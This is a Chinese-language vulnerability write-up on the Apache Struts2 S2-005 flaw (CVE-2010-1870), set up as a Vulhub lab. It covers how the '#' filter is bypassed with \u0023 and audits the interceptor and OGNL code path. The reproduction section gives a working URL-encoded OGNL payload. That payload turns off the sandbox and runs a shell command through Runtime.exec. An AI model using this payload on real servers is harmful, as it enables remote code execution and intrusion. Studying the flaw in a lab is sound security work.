
# 0X00 漏洞信息
S2-005的出现是官方在修补S2-003（版本：Struts 2.0.12）漏洞时考虑不充分而造成的，Struts2会将http的每个参数名解析为OGNL语句（可理解为java代码）执行，而OGNL通过#来访问Struts2的对象，Struts2通过用拦截器过滤字符#来防止被恶意利用，然而忽略了通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制。S2-003漏洞，官方通过增加安全限制配置（禁止使用方法调用和类方法等）来文档，但是安全配置被再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，但是此安全配置仍然可以通过OGNL表达式绕过，也就导致了S2-005的出现。

XWork利用巴西GET参数的键和值OGNL表达式解析成Java语句，如：
```
user.address.city=Bishkek&user['favoriteDrink']=kumys
//会被转化成
action.getUser().getAddress().setCity("Bishkek")
action.getUser().setFavoriteDrink("kumys") 
```

触发漏洞利用了这个点，再配合OGNL的沙盒-绕过方法，组成了S2003。官方对003的修复方法是增加了安全模式（沙），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：

- S2-003 使用\u0023绕过2对#的防御
- S2-003后官方增加了安全模式（沙盒）
- S2-005 使用OGNL表达式将沙盒关闭，继续执行代码


# 0X01 漏洞概述
| 漏洞名称 | Struts2-005远程命令执行漏洞 |
| --- | --- |
| 漏洞等级 | 高危 |
| CVE编号 | CVE-2010-1870 |
| CNVD编号 | 暂无 |
| CNNVD编号 | 暂无 |
| 其他编号 | 暂无 |
| 披露时间 | 2010/05/10 |
| 分数 | 5.0 |
| CVSS |  (AV:N/AC:L/Au:N/C:N/I:P/A:N) |
| 披露链接 | [https://nvd.nist.gov/vuln/detail/CVE-2010-1870](https://nvd.nist.gov/vuln/detail/CVE-2010-1870) |


# 0X02 影响范围
Struts 2.0.0 - Struts 2.1.8.1


# 0X03 环境搭建
使用Vulhub搭建
```
cd vulhub/struts2/s2-005/
docker-compose up -d
```
![image.png](_img/assets/1671783501864-8003c7fe-a52d-4797-a986-2529f05dd013.png)

浏览器访问
![image.png](_img/assets/1671784082635-2c61cfda-1de2-4182-ae55-0c865af04775.png)


# 0X04 代码审计
由官方发布的漏洞通告可知，S2-005是绕过XWorkParameterinterceptors对#的过滤而触发的远程命令执行漏洞，这个拦截器主要就是对url的参数进行一些处理，执行方法是doIntercept
![image.png](_img/assets/1671782806976-9192fa3e-dff6-4a2d-a219-416840fb7dca.png)

setParameters方法调用了acceptableName来判断是否含有非法字符，例如调用对象的#
![image.png](_img/assets/1671782827600-686c6aac-1cd7-4fb6-9f93-d65356f25679.png)
![image.png](_img/assets/1671782835287-f38e7e83-b3b1-44a3-94bc-54991342a538.png)

通过判断后，会调用setValue把参数变成键值对放入另一个valueStack中
![image.png](_img/assets/1671782840549-b5f7c9df-05d3-453b-b48e-d26ac4b7707d.png)

在ognl中，这个valueStack方法的实现类是OgnlValueStack.class，在这个类的setValue方法中，又调用了ognlUtil的setValue方法
![image.png](_img/assets/1671782845066-31f55196-0360-4500-9a64-eca9e28ea8a0.png)

在ognlUtil中可以看到调用了ognl的setValue方法，在调用这个方法之前，会先调用内部的compile方法，将传入的参数解析，也就是将\u0023解析为#
![image.png](_img/assets/1671782851148-12445430-1c0e-45fd-b006-4718716997ee.png)
![image.png](_img/assets/1671782882911-8091a739-fbe6-4f76-bcfa-350604992362.png)

解析之后的字符串会在ognl.setValue方法中执行
![image.png](_img/assets/1671782888805-cf0813b2-8c27-4a16-a3c5-7a9d7212dead.png)


# 0X05 漏洞复现
```
?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/sussess%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
```
![image.png](_img/assets/1671784610138-3f9bff1e-6933-4f20-9165-475641f60538.png)

验证
```
docker ps #查看容器ID
docker exec -it ID /bin/bash #进入容器
ls /tmp  #查看容器内tmp目录
exit  #退出容器
```
![image.png](_img/assets/1671784655636-50230786-ab79-4f6f-9c5e-ec514ec848ae.png)


# 0X05 工具
[Struts2-Scan](https://www.yuque.com/xmtxsec/network_security/iczxlyyk6v7tzfwt?view=doc_embed)
